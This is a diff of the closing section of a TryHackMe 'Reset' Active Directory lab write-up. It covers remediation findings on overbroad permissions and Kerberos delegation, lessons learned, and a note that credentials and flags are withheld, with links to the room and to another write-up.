-**Risk:** Rights that appear harmless in isolation may become high impact when they connect multiple objects.
-
-**Recommendation:** Review and minimize GenericAll, GenericWrite, WriteDACL and delegated password-management permissions. Document why each assignment is necessary; remove unused grants.
-
-**Retest:** Recollect object permissions and verify that unneeded control relationships disappear without breaking legitimate administration.
-
-### Finding C: overbroad Kerberos delegation
-
-**Risk:** Excessive delegation or poor protection of delegating identities can weaken the boundary between an application account and privileged service access.
-
-**Recommendation:** Restrict delegation to necessary SPNs, protect privileged identities, review control over delegating accounts and monitor configuration changes.
-
-**Retest:** Verify that approved service operations continue to work while unauthorized impersonation and service access are refused.
-
-## 10. Outcome, lessons and evidence limits
-
-**Outcome verified:** Both Reset objectives completed on **30 October 2026** in the assigned TryHackMe environment. No production systems were tested.
-
-**What I learned:**
-
-1. **Difficulty labels are subjective.** Once I followed the actual identity relationships, this Hard room felt easier to me than several other AD labs.
-2. **Authentication, authorization and service access are different proofs.** A login result cannot substitute for evidence of an effective privilege.
-3. **A permission graph is not an exploit log.** Graph findings must be assessed and validated before being called vulnerabilities.
-4. **Delegation is a trust boundary, not merely a Kerberos feature.** Its safety depends on who controls the service identity and what the delegation authorizes.
-5. **A professional write-up preserves provenance.** Recorded outputs, reconstructed examples and external documentation must never be silently mixed.
-
-### About the full solution
-
-I retain the detailed technical notes for my own lab history. I have **not** placed the challenge-specific credential and escalation sequence, reusable ticket material, passwords or flags in this public article, because the room is still available and not verified retired. An older third-party walkthrough existing online is not permission to publish another complete solution under TryHackMe's current rules.
-
-**Reference:** [TryHackMe Acceptable Use Policy, §8: Content integrity](https://tryhackme.com/legal/acceptable-use-policy).
+I completed both objectives in this authorized TryHackMe environment. **No plaintext passwords, cracked hashes or flag values have been published**.
 
 ---
 
-*This post describes authorized CTF training and generalized security methodology. Generic command samples are explicitly labeled and must only be used on systems the reader is authorized to assess.*
+**Room:** [TryHackMe Reset](https://tryhackme.com/room/resetui) · **Portfolio:** [ALLAKORI](https://allakori.github.io/) · **TryHackMe profile:** [allakori](https://tryhackme.com/p/allakori)
+
+*For a second perspective on the same room, see [jaxafed's earlier write-up](https://jaxafed.github.io/posts/tryhackme-reset/). The commands and outcomes labeled “recorded” in this article refer to my own October 30 session; the external article is not treated as evidence of what I personally ran.*
